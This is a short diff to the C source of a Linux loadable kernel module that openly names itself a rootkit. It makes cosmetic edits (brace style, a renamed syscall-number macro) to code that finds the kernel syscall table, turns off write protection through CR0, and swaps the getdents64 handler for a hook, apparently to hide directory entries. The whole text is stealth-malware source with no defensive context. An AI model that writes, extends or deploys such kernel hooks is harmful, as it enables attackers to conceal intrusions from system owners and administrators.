@@ -84,16 +84,15 @@ asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, uns
 static int __init ghost_init(void)
 {
     __syscall_table = find_syscall_table();
-    if(!__syscall_table)
-    {
+    if (!__syscall_table) {
         printk(KERN_INFO "Error, syscall_table not found");
         return -1;
     }
 
     cr0 = read_cr0();
-    orig_getdents64 = (void *)__syscall_table[__NR_getdents];
+    orig_getdents64 = (void *)__syscall_table[MY_NR_getdents];
     unprotect_memory();
-    __syscall_table[__NR_getdents] = (unsigned long)hook_getdents64;
+    __syscall_table[MY_NR_getdents] = (unsigned long)hook_getdents64;
     protect_memory();
 
     printk(KERN_INFO "Rootkit loaded: Syscall hooked\n");
@@ -103,7 +102,7 @@ static int __init ghost_init(void)
 static void __exit ghost_exit(void)
 {
     unprotect_memory();
-    __syscall_table[__NR_getdents] = (unsigned long)orig_getdents64;
+    __syscall_table[MY_NR_getdents] = (unsigned long)orig_getdents64;
     protect_memory();
 
     printk(KERN_INFO "Rootkit unloaded: Syscall restored\n");
